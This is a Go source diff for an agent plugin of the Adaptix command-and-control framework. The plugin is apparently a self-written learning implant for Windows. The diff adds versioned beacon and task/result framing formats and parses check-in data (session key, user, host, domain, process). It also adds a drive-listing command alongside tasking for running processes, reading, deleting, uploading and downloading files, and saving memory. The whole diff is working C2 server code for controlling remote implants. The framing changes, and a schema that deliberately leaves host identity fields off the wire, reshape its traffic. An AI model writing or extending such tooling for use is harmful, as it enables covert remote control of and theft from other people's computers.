@@ -49,6 +49,126 @@ var (
 	AgentWatermark string
 )
 
+const (
+	// directHTTPSBeatV2Magic marks the self-authored learning-agent heartbeat
+	// dialect. The first 8 bytes are still consumed by the HTTP listener wrapper;
+	// this magic is the first field inside the extender-visible beat body.
+	directHTTPSBeatV2Magic  uint = 0x44484232 // "DHB2"
+	directHTTPSBeatV2Schema uint = 1
+
+	// Schema 2 keeps the same DHB2 magic but appends a capability mask after
+	// schema, so the server can negotiate packet envelopes per live agent.
+	directHTTPSBeatV2CapsSchema     uint = 2
+	directHTTPSBeatV3SectionSchema  uint = 3
+	selfC2BeatV4Schema              uint = 4
+	selfC2BeatV4Magic               uint = 0x4c504834 // "LPH4"
+	selfC2BeatV5Schema              uint = 5
+	selfC2BeatV5Magic               uint = 0x4c504835 // "LPH5"
+	directHTTPSCapTaskEnvelopeV2    uint = 1 << 0
+	directHTTPSCapResultEnvelopeV2  uint = 1 << 1
+	directHTTPSCapSectionEnvelopeV3 uint = 1 << 2
+	selfC2CapNativeFrameV4          uint = 1 << 3
+
+	// The outer frame flags field can switch the envelope body from a raw
+	// compatibility record stream to a self-authored section/TLV layout.
+	directHTTPSEnvelopeFlagSectioned uint32 = 1 << 0
+	directHTTPSSectionMeta           uint32 = 1
+	directHTTPSSectionLegacyRecords  uint32 = 2
+
+	// Schema4 uses a native task-record section on the wire instead of sending
+	// the old command-record stream as a blob. The Windows side maps these
+	// action ids back into its already-tested handler table at runtime.
+	selfC2SectionTaskRecordV4        uint32 = 0x1010
+	selfC2SectionResultStreamV4      uint32 = 0x2020 // accepted for schema4 payloads generated before 2026-07-10
+	selfC2SectionResultBundleV4      uint32 = 0x2021
+	selfC2TaskRecordV4Schema         uint32 = 1
+	selfC2ResultStreamV4Schema       uint32 = 1
+	selfC2ResultBundleV4Schema       uint32 = 1
+	selfC2ResultCodecCompatBody      uint32 = 1
+	selfC2ResultCodecNativeFields    uint32 = 2
+	selfC2NativeResultRecordV4Schema uint32 = 1
+	selfC2NativeResultFieldText      uint32 = 1
+	selfC2NativeResultFieldPath      uint32 = 2
+
+	selfC2ActionHello      uint32 = 0x0101
+	selfC2ActionRunProcess uint32 = 0x0102
+	selfC2ActionPwd        uint32 = 0x0201
+	selfC2ActionCd         uint32 = 0x0202
+	selfC2ActionLs         uint32 = 0x0203
+	selfC2ActionCat        uint32 = 0x0204
+	selfC2ActionMkdir      uint32 = 0x0205
+	selfC2ActionRm         uint32 = 0x0206
+	selfC2ActionCopy       uint32 = 0x0207
+	selfC2ActionMove       uint32 = 0x0208
+	selfC2ActionDisks      uint32 = 0x0209
+	selfC2ActionDownload   uint32 = 0x0301
+	selfC2ActionUpload     uint32 = 0x0302
+	selfC2ActionSaveMemory uint32 = 0x0303
+
+	// LPT4/LPR4 are the neutral self-authored task/result frame magics used by
+	// schema4 agents. DHT2/DHR2 remain accepted only for transitional agents.
+	selfC2TaskFrameV4Magic    string = "LPT4"
+	selfC2ResultFrameV4Magic  uint   = 0x4c505234 // "LPR4"
+	directHTTPSTaskV2Magic    string = "DHT2"
+	directHTTPSTaskV2Schema   uint32 = 1
+	directHTTPSResultV2Magic  uint   = 0x44485232 // "DHR2"
+	directHTTPSResultV2Schema uint   = 1
+)
+
+type directHTTPSAgentCapabilities struct {
+	BeatSchema   uint `json:"beat_schema"`
+	Capabilities uint `json:"capabilities"`
+}
+
+func packDirectHTTPSCapabilities(beatSchema uint, capabilities uint) []byte {
+	data, err := json.Marshal(directHTTPSAgentCapabilities{
+		BeatSchema:   beatSchema,
+		Capabilities: capabilities,
+	})
+	if err != nil {
+		return nil
+	}
+	return data
+}
+
+func parseDirectHTTPSCapabilities(agentData adaptix.AgentData) (directHTTPSAgentCapabilities, bool) {
+	var caps directHTTPSAgentCapabilities
+	if len(agentData.CustomData) == 0 {
+		return caps, false
+	}
+	if err := json.Unmarshal(agentData.CustomData, &caps); err != nil {
+		return caps, false
+	}
+	return caps, true
+}
+
+func directHTTPSAgentSupportsPacketEnvelopeV2(agentData adaptix.AgentData) bool {
+	caps, ok := parseDirectHTTPSCapabilities(agentData)
+	if !ok {
+		return false
+	}
+	want := directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2
+	return caps.BeatSchema >= directHTTPSBeatV2CapsSchema && (caps.Capabilities&want) == want
+}
+
+func directHTTPSAgentSupportsSectionEnvelopeV3(agentData adaptix.AgentData) bool {
+	caps, ok := parseDirectHTTPSCapabilities(agentData)
+	if !ok {
+		return false
+	}
+	want := directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3
+	return caps.BeatSchema >= directHTTPSBeatV3SectionSchema && (caps.Capabilities&want) == want
+}
+
+func selfC2AgentSupportsNativeFrameV4(agentData adaptix.AgentData) bool {
+	caps, ok := parseDirectHTTPSCapabilities(agentData)
+	if !ok {
+		return false
+	}
+	want := directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3 | selfC2CapNativeFrameV4
+	return caps.BeatSchema >= selfC2BeatV4Schema && (caps.Capabilities&want) == want
+}
+
 // InitPlugin 是 Adaptix 加载插件时最先调用的入口，用来保存 teamserver、模块目录和水印。
 func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
 	ModuleDir = moduleDir
@@ -496,16 +616,8 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	return payload, filename, nil
 }
 
-// CreateAgent 解析 agent 第一次 check-in 的心跳包，并生成 Adaptix 里显示的 agent 信息。
-func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
-	var agentData adaptix.AgentData
-	packer := CreatePacker(beat)
-
-	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
-		return agentData, nil, errors.New("error agentData data")
-	}
-
-	agentData.Sleep = packer.ParseInt32()
+func parseBeatCore(packer *Packer, agentData *adaptix.AgentData, sleep uint) (uint, uint8, uint8, uint, uint8) {
+	agentData.Sleep = sleep
 	agentData.Jitter = packer.ParseInt32()
 	agentData.KillDate = int(packer.ParseInt32())
 	agentData.WorkingTime = int(packer.ParseInt32())
@@ -520,7 +632,10 @@ func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.Exten
 	minorVersion := packer.ParseInt8()
 	internalIp := packer.ParseInt32()
 	flag := packer.ParseInt8()
+	return buildNumber, majorVersion, minorVersion, internalIp, flag
+}
 
+func finalizeBeatHostFields(agentData *adaptix.AgentData, buildNumber uint, majorVersion uint8, minorVersion uint8, internalIp uint, flag uint8) {
 	agentData.Arch = "x32"
 	if (flag & 0b00000001) > 0 {
 		agentData.Arch = "x64"
@@ -543,11 +658,94 @@ func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.Exten
 
 	agentData.InternalIP = int32ToIPv4(internalIp)
 	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, isServer, systemArch)
+}
+
+func parseLegacyBeat(packer *Packer, firstSleep uint) (adaptix.AgentData, error) {
+	var agentData adaptix.AgentData
+
+	if false == packer.CheckPacker([]string{"int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
+		return agentData, errors.New("error agentData legacy data")
+	}
+
+	buildNumber, majorVersion, minorVersion, internalIp, flag := parseBeatCore(packer, &agentData, firstSleep)
+	finalizeBeatHostFields(&agentData, buildNumber, majorVersion, minorVersion, internalIp, flag)
 	agentData.SessionKey = packer.ParseBytes()
+
 	agentData.Domain = string(packer.ParseBytes())
 	agentData.Computer = string(packer.ParseBytes())
 	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
 	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
+
+	return agentData, nil
+}
+
+func parseBeatV2(packer *Packer) (adaptix.AgentData, error) {
+	var agentData adaptix.AgentData
+
+	if false == packer.CheckPacker([]string{"int"}) {
+		return agentData, errors.New("error agentData v2 schema")
+	}
+
+	schema := packer.ParseInt32()
+	capabilities := uint(0)
+	if schema == directHTTPSBeatV2CapsSchema || schema == directHTTPSBeatV3SectionSchema || schema == selfC2BeatV4Schema || schema == selfC2BeatV5Schema {
+		if false == packer.CheckPacker([]string{"int"}) {
+			return agentData, errors.New("error agentData v2 capabilities")
+		}
+		capabilities = packer.ParseInt32()
+	} else if schema != directHTTPSBeatV2Schema {
+		return agentData, fmt.Errorf("unsupported agentData beat schema %d", schema)
+	}
+
+	beatCoreTypes := []string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}
+	if schema == selfC2BeatV5Schema {
+		// schema5 carries session key + process only; the remaining host identity
+		// arrays are deliberately absent from the wire format.
+		beatCoreTypes = []string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array"}
+	}
+	if false == packer.CheckPacker(beatCoreTypes) {
+		return agentData, errors.New("error agentData v2 data")
+	}
+
+	sleep := packer.ParseInt32()
+	buildNumber, majorVersion, minorVersion, internalIp, flag := parseBeatCore(packer, &agentData, sleep)
+	finalizeBeatHostFields(&agentData, buildNumber, majorVersion, minorVersion, internalIp, flag)
+	agentData.SessionKey = packer.ParseBytes()
+
+	// schema5 only keeps the process string.  schema4 retains the original
+	// process -> username -> computer -> domain order for functional profiles.
+	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
+	if schema == selfC2BeatV5Schema {
+		agentData.CustomData = packDirectHTTPSCapabilities(schema, capabilities)
+		return agentData, nil
+	}
+	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
+	agentData.Computer = string(packer.ParseBytes())
+	agentData.Domain = string(packer.ParseBytes())
+	agentData.CustomData = packDirectHTTPSCapabilities(schema, capabilities)
+
+	return agentData, nil
+}
+
+// CreateAgent 解析 agent 第一次 check-in 的心跳包，并生成 Adaptix 里显示的 agent 信息。
+func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
+	var agentData adaptix.AgentData
+	packer := CreatePacker(beat)
+
+	if false == packer.CheckPacker([]string{"int"}) {
+		return agentData, nil, errors.New("error agentData data")
+	}
+
+	first := packer.ParseInt32()
+	var err error
+	if first == directHTTPSBeatV2Magic || first == selfC2BeatV4Magic || first == selfC2BeatV5Magic {
+		agentData, err = parseBeatV2(packer)
+	} else {
+		agentData, err = parseLegacyBeat(packer, first)
+	}
+	if err != nil {
+		return agentData, nil, err
+	}
 
 	return agentData, &ExtenderAgent{}, nil
 }
@@ -565,8 +763,9 @@ func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
 // PackTasks 把多个 Adaptix 任务打成 agent 能识别的一段二进制任务包。
 func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
 	var (
-		array []interface{}
-		err   error
+		array       []interface{}
+		nativeTasks []selfC2NativeTaskRecord
+		err         error
 	)
 
 	for _, taskData := range tasks {
@@ -576,6 +775,14 @@ func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix
 		}
 		array = append(array, taskData.Data)
 		array = append(array, int(taskId))
+
+		if selfC2AgentSupportsNativeFrameV4(agentData) {
+			nativeTask, err := buildSelfC2NativeTaskRecord(taskData.Data, uint32(taskId))
+			if err != nil {
+				return nil, err
+			}
+			nativeTasks = append(nativeTasks, nativeTask)
+		}
 	}
 
 	packData, err := PackArray(array)
@@ -583,10 +790,180 @@ func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix
 		return nil, err
 	}
 
-	size := make([]byte, 4)
-	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
-	packData = append(size, packData...)
-	return packData, nil
+	if selfC2AgentSupportsNativeFrameV4(agentData) {
+		return packSelfC2TaskFrameV4(nativeTasks), nil
+	}
+	if directHTTPSAgentSupportsSectionEnvelopeV3(agentData) {
+		return packTaskSectionEnvelopeV3(packData, len(tasks)), nil
+	}
+	if directHTTPSAgentSupportsPacketEnvelopeV2(agentData) {
+		return packTaskEnvelopeV2(packData, len(tasks)), nil
+	}
+	return packLegacyTaskBody(packData), nil
+}
+
+func packLegacyTaskBody(body []byte) []byte {
+	packData := make([]byte, 4, 4+len(body))
+	binary.LittleEndian.PutUint32(packData, uint32(len(body)))
+	packData = append(packData, body...)
+	return packData
+}
+
+func appendLE32(buf []byte, value uint32) []byte {
+	field := make([]byte, 4)
+	binary.LittleEndian.PutUint32(field, value)
+	return append(buf, field...)
+}
+
+func appendBE32(buf []byte, value uint32) []byte {
+	field := make([]byte, 4)
+	binary.BigEndian.PutUint32(field, value)
+	return append(buf, field...)
+}
+
+type selfC2NativeTaskRecord struct {
+	TaskID        uint32
+	ActionID      uint32
+	ArgumentBytes []byte
+}
+
+func selfC2ActionFromCommand(commandID uint32) (uint32, bool) {
+	switch commandID {
+	case COMMAND_HELLO:
+		return selfC2ActionHello, true
+	case COMMAND_PS_RUN:
+		return selfC2ActionRunProcess, true
+	case COMMAND_PWD:
+		return selfC2ActionPwd, true
+	case COMMAND_CD:
+		return selfC2ActionCd, true
+	case COMMAND_LS:
+		return selfC2ActionLs, true
+	case COMMAND_CAT:
+		return selfC2ActionCat, true
+	case COMMAND_MKDIR:
+		return selfC2ActionMkdir, true
+	case COMMAND_RM:
+		return selfC2ActionRm, true
+	case COMMAND_COPY:
+		return selfC2ActionCopy, true
+	case COMMAND_MV:
+		return selfC2ActionMove, true
+	case COMMAND_DISKS:
+		return selfC2ActionDisks, true
+	case COMMAND_DOWNLOAD:
+		return selfC2ActionDownload, true
+	case COMMAND_UPLOAD:
+		return selfC2ActionUpload, true
+	case COMMAND_SAVEMEMORY:
+		return selfC2ActionSaveMemory, true
+	default:
+		return 0, false
+	}
+}
+
+func buildSelfC2NativeTaskRecord(taskData []byte, taskID uint32) (selfC2NativeTaskRecord, error) {
+	if len(taskData) < 4 {
+		return selfC2NativeTaskRecord{}, errors.New("native task data is too short")
+	}
+	commandID := binary.LittleEndian.Uint32(taskData[:4])
+	actionID, ok := selfC2ActionFromCommand(commandID)
+	if !ok {
+		return selfC2NativeTaskRecord{}, fmt.Errorf("command %d does not have a schema4 native action id", commandID)
+	}
+	return selfC2NativeTaskRecord{
+		TaskID:        taskID,
+		ActionID:      actionID,
+		ArgumentBytes: taskData[4:],
+	}, nil
+}
+
+func packSelfC2NativeTaskRecordValue(task selfC2NativeTaskRecord) []byte {
+	value := make([]byte, 0, 16+len(task.ArgumentBytes))
+	value = appendLE32(value, selfC2TaskRecordV4Schema)
+	value = appendLE32(value, task.TaskID)
+	value = appendLE32(value, task.ActionID)
+	value = appendLE32(value, uint32(len(task.ArgumentBytes)))
+	value = append(value, task.ArgumentBytes...)
+	return value
+}
+
+// packTaskSectionEnvelopeV3 把 DHT2 body 变成 section/TLV：
+//
+//	section_count/le32
+//	section_type/le32 | section_len/le32 | section_value
+//
+// 当前只新增 meta section，真正的任务流仍放在 legacy-records section，
+// 这样 command handler 不需要一次性迁移。
+func buildTaskSectionBody(compatBody []byte, taskCount int, schema uint32, capabilities uint32) []byte {
+	meta := make([]byte, 0, 16)
+	for _, value := range []uint32{schema, capabilities, uint32(taskCount), uint32(len(compatBody))} {
+		meta = appendLE32(meta, value)
+	}
+
+	sectioned := make([]byte, 0, 4+8+len(meta)+8+len(compatBody))
+	sectioned = appendLE32(sectioned, 2)
+	sectioned = appendLE32(sectioned, directHTTPSSectionMeta)
+	sectioned = appendLE32(sectioned, uint32(len(meta)))
+	sectioned = append(sectioned, meta...)
+	sectioned = appendLE32(sectioned, directHTTPSSectionLegacyRecords)
+	sectioned = appendLE32(sectioned, uint32(len(compatBody)))
+	sectioned = append(sectioned, compatBody...)
+	return sectioned
+}
+
+func packTaskSectionEnvelopeV3(compatBody []byte, taskCount int) []byte {
+	capabilities := uint32(directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3)
+	sectioned := buildTaskSectionBody(compatBody, taskCount, uint32(directHTTPSBeatV3SectionSchema), capabilities)
+	return packTaskEnvelopeV2WithFlags(sectioned, taskCount, directHTTPSEnvelopeFlagSectioned)
+}
+
+func packSelfC2TaskFrameV4(tasks []selfC2NativeTaskRecord) []byte {
+	capabilities := uint32(directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3 | selfC2CapNativeFrameV4)
+	meta := make([]byte, 0, 16)
+	for _, value := range []uint32{uint32(selfC2BeatV4Schema), capabilities, uint32(len(tasks)), uint32(len(tasks))} {
+		meta = appendLE32(meta, value)
+	}
+
+	sectioned := make([]byte, 0, 4+8+len(meta)+(8+16)*len(tasks))
+	sectioned = appendLE32(sectioned, uint32(1+len(tasks)))
+	sectioned = appendLE32(sectioned, directHTTPSSectionMeta)
+	sectioned = appendLE32(sectioned, uint32(len(meta)))
+	sectioned = append(sectioned, meta...)
+	for _, task := range tasks {
+		value := packSelfC2NativeTaskRecordValue(task)
+		sectioned = appendLE32(sectioned, selfC2SectionTaskRecordV4)
+		sectioned = appendLE32(sectioned, uint32(len(value)))
+		sectioned = append(sectioned, value...)
+	}
+	return packSelfC2TaskFrameV4WithFlags(sectioned, len(tasks), directHTTPSEnvelopeFlagSectioned)
+}
+
+// packTaskEnvelopeV2 给服务端下发任务增加自研 v2 外壳：
+//
+//	DHT2 | schema/le32 | flags/le32 | task_count/le32 | body_len/le32 | legacy_body
+//
+// body 内部仍是当前学习 agent 已验证过的 opcode/参数/taskId 顺序，保证功能面不变。
+func packTaskEnvelopeV2(body []byte, taskCount int) []byte {
+	return packTaskEnvelopeV2WithFlags(body, taskCount, 0)
+}
+
+func packTaskEnvelopeV2WithFlags(body []byte, taskCount int, flags uint32) []byte {
+	return packTaskFrameWithMagic(body, taskCount, flags, directHTTPSTaskV2Magic)
+}
+
+func packSelfC2TaskFrameV4WithFlags(body []byte, taskCount int, flags uint32) []byte {
+	return packTaskFrameWithMagic(body, taskCount, flags, selfC2TaskFrameV4Magic)
+}
+
+func packTaskFrameWithMagic(body []byte, taskCount int, flags uint32, magic string) []byte {
+	packData := make([]byte, 0, 20+len(body))
+	packData = append(packData, []byte(magic)...)
+	for _, value := range []uint32{directHTTPSTaskV2Schema, flags, uint32(taskCount), uint32(len(body))} {
+		packData = appendLE32(packData, value)
+	}
+	packData = append(packData, body...)
+	return packData
 }
 
 // PivotPackData 是 pivot 转发接口；direct_https 不支持，所以直接返回错误。
@@ -671,6 +1048,10 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			goto RET
 		}
 		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}
+
+	case "disks":
+		messageData.Message = "Task: list logical drives"
+		array = []interface{}{COMMAND_DISKS}
 
 	case "hello":
 		messageData.Message = "Task: run hello test"
@@ -757,15 +1138,12 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 		Sync:        true,
 	}
 
-	packer := CreatePacker(decryptedData)
-	if false == packer.CheckPacker([]string{"int"}) {
-		return errors.New("failed to unmarshal message")
+	recordData, err := unpackResultEnvelope(decryptedData)
+	if err != nil {
+		return err
 	}
 
-	size := packer.ParseInt32()
-	if size-4 != packer.Size() {
-		return errors.New("failed to unmarshal message")
-	}
+	packer := CreatePacker(recordData)
 
 	for packer.Size() >= 8 {
 		if false == packer.CheckPacker([]string{"int", "int"}) {
@@ -936,6 +1314,49 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			}
 			Ts.TsClientGuiFilesWindows(task, rootPath, items)
 
+		case COMMAND_DISKS:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			result := packer.ParseInt8()
+			if result == 0 {
+				if false == packer.CheckPacker([]string{"int"}) {
+					goto HANDLER
+				}
+				errorCode := packer.ParseInt32()
+				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
+				task.MessageType = adaptix.MESSAGE_ERROR
+				break
+			}
+			if false == packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			driveCount := packer.ParseInt32()
+			outputText := "Drive   Type\n-----   ----"
+			for i := uint(0); i < driveCount; i++ {
+				if false == packer.CheckPacker([]string{"byte", "int"}) {
+					goto HANDLER
+				}
+				drive := packer.ParseInt8()
+				driveType := packer.ParseInt32()
+				typeName := "unknown"
+				switch driveType {
+				case 2:
+					typeName = "removable"
+				case 3:
+					typeName = "fixed"
+				case 4:
+					typeName = "remote"
+				case 5:
+					typeName = "cdrom"
+				case 6:
+					typeName = "ramdisk"
+				}
+				outputText += fmt.Sprintf("\n%c:      %s (%d)", drive, typeName, driveType)
+			}
+			task.Message = "Logical drives:"
+			task.ClearText = outputText
+
 		case COMMAND_MKDIR:
 			if false == packer.CheckPacker([]string{"array"}) {
 				goto HANDLER
@@ -1003,4 +1424,180 @@ HANDLER:
 		Ts.TsTaskUpdate(agentData.Id, task)
 	}
 	return nil
+}
+
+// unpackResultEnvelope 兼容解析 agent 回传：
+//
+//	v2:     DHR2 | schema/be32 | flags/be32 | body_len/be32 | legacy_records
+//	legacy: total_len/be32 | legacy_records
+//
+// 这样可以在切换运行中 agent 时降低回滚成本；server 侧统一把返回值交给旧记录解析器。
+func unpackResultEnvelope(decryptedData []byte) ([]byte, error) {
+	if len(decryptedData) >= 16 {
+		packer := CreatePacker(decryptedData)
+		first := packer.ParseInt32()
+		if first == directHTTPSResultV2Magic || first == selfC2ResultFrameV4Magic {
+			schema := packer.ParseInt32()
+			if schema != directHTTPSResultV2Schema {
+				return nil, fmt.Errorf("unsupported direct_https result envelope schema %d", schema)
+			}
+			flags := uint32(packer.ParseInt32())
+			bodyLen := packer.ParseInt32()
+			if bodyLen != packer.Size() {
+				return nil, errors.New("failed to unmarshal v2 result envelope")
+			}
+			body := decryptedData[16:]
+			if flags&directHTTPSEnvelopeFlagSectioned != 0 {
+				return unpackSectionedResultBody(body)
+			}
+			return body, nil
+		}
+	}
+
+	packer := CreatePacker(decryptedData)
+	if false == packer.CheckPacker([]string{"int"}) {
+		return nil, errors.New("failed to unmarshal message")
+	}
+	size := packer.ParseInt32()
+	if size-4 != packer.Size() {
+		return nil, errors.New("failed to unmarshal message")
+	}
+	return decryptedData[4:], nil
+}
+
+func unpackSectionedResultBody(body []byte) ([]byte, error) {
+	packer := CreatePacker(body)
+	if false == packer.CheckPacker([]string{"int"}) {
+		return nil, errors.New("failed to unmarshal sectioned result body")
+	}
+	sectionCount := packer.ParseInt32()
+	for i := uint(0); i < sectionCount; i++ {
+		if false == packer.CheckPacker([]string{"int", "int"}) {
+			return nil, errors.New("failed to unmarshal sectioned result header")
+		}
+		sectionType := uint32(packer.ParseInt32())
+		sectionLen := packer.ParseInt32()
+		if packer.Size() < sectionLen {
+			return nil, errors.New("failed to unmarshal sectioned result length")
+		}
+		sectionValue := packer.buffer[:sectionLen]
+		packer.buffer = packer.buffer[sectionLen:]
+		if sectionType == directHTTPSSectionLegacyRecords {
+			return sectionValue, nil
+		}
+		if sectionType == selfC2SectionResultStreamV4 {
+			return unpackSelfC2ResultStreamV4(sectionValue)
+		}
+		if sectionType == selfC2SectionResultBundleV4 {
+			return unpackSelfC2ResultBundleV4(sectionValue)
+		}
+	}
+	return nil, errors.New("sectioned result body does not contain a supported result stream")
+}
+
+func unpackSelfC2ResultBundleV4(value []byte) ([]byte, error) {
+	packer := CreatePacker(value)
+	if false == packer.CheckPacker([]string{"int", "int", "int", "int"}) {
+		return nil, errors.New("failed to unmarshal native result bundle header")
+	}
+	schema := uint32(packer.ParseInt32())
+	if schema != selfC2ResultBundleV4Schema {
+		return nil, fmt.Errorf("unsupported native result bundle schema %d", schema)
+	}
+	codec := uint32(packer.ParseInt32())
+	_ = packer.ParseInt32()
+	payloadLen := packer.ParseInt32()
+	if packer.Size() < payloadLen {
+		return nil, errors.New("failed to unmarshal native result bundle payload length")
+	}
+	payload := packer.buffer[:payloadLen]
+	if codec == selfC2ResultCodecCompatBody {
+		return payload, nil
+	}
+	if codec == selfC2ResultCodecNativeFields {
+		return unpackSelfC2NativeResultCodecV2(payload)
+	}
+	return nil, fmt.Errorf("unsupported native result bundle codec %d", codec)
+}
+
+func selfC2CompatCommandFromAction(actionID uint32) (uint32, bool) {
+	switch actionID {
+	case selfC2ActionHello:
+		return COMMAND_HELLO, true
+	case selfC2ActionPwd:
+		return COMMAND_PWD, true
+	case selfC2ActionDisks:
+		return COMMAND_DISKS, true
+	default:
+		return 0, false
+	}
+}
+
+func packCompatBytesResult(taskID uint32, commandID uint32, value []byte) []byte {
+	body := make([]byte, 0, 12+len(value))
+	body = appendBE32(body, taskID)
+	body = appendBE32(body, commandID)
+	body = appendBE32(body, uint32(len(value)))
+	body = append(body, value...)
+	return body
+}
+
+func unpackSelfC2NativeResultCodecV2(payload []byte) ([]byte, error) {
+	packer := CreatePacker(payload)
+	if false == packer.CheckPacker([]string{"int"}) {
+		return nil, errors.New("failed to unmarshal native result codec header")
+	}
+	recordCount := packer.ParseInt32()
+	compat := []byte{}
+	for i := uint(0); i < recordCount; i++ {
+		if false == packer.CheckPacker([]string{"int", "int", "int", "int", "int"}) {
+			return nil, errors.New("failed to unmarshal native result record header")
+		}
+		recordSchema := uint32(packer.ParseInt32())
+		if recordSchema != selfC2NativeResultRecordV4Schema {
+			return nil, fmt.Errorf("unsupported native result record schema %d", recordSchema)
+		}
+		taskID := uint32(packer.ParseInt32())
+		actionID := uint32(packer.ParseInt32())
+		fieldType := uint32(packer.ParseInt32())
+		fieldLen := packer.ParseInt32()
+		if packer.Size() < fieldLen {
+			return nil, errors.New("failed to unmarshal native result record payload length")
+		}
+		fieldValue := packer.buffer[:fieldLen]
+		packer.buffer = packer.buffer[fieldLen:]
+
+		commandID, ok := selfC2CompatCommandFromAction(actionID)
+		if !ok {
+			return nil, fmt.Errorf("unsupported native result action %d", actionID)
+		}
+		switch actionID {
+		case selfC2ActionHello:
+			if fieldType != selfC2NativeResultFieldText {
+				return nil, fmt.Errorf("unexpected native hello field type %d", fieldType)
+			}
+		case selfC2ActionPwd:
+			if fieldType != selfC2NativeResultFieldPath {
+				return nil, fmt.Errorf("unexpected native pwd field type %d", fieldType)
+			}
+		}
+		compat = append(compat, packCompatBytesResult(taskID, commandID, fieldValue)...)
+	}
+	return compat, nil
+}
+
+func unpackSelfC2ResultStreamV4(value []byte) ([]byte, error) {
+	packer := CreatePacker(value)
+	if false == packer.CheckPacker([]string{"int", "int"}) {
+		return nil, errors.New("failed to unmarshal native result stream header")
+	}
+	schema := uint32(packer.ParseInt32())
+	if schema != selfC2ResultStreamV4Schema {
+		return nil, fmt.Errorf("unsupported native result stream schema %d", schema)
+	}
+	streamLen := packer.ParseInt32()
+	if packer.Size() < streamLen {
+		return nil, errors.New("failed to unmarshal native result stream length")
+	}
+	return packer.buffer[:streamLen], nil
 }
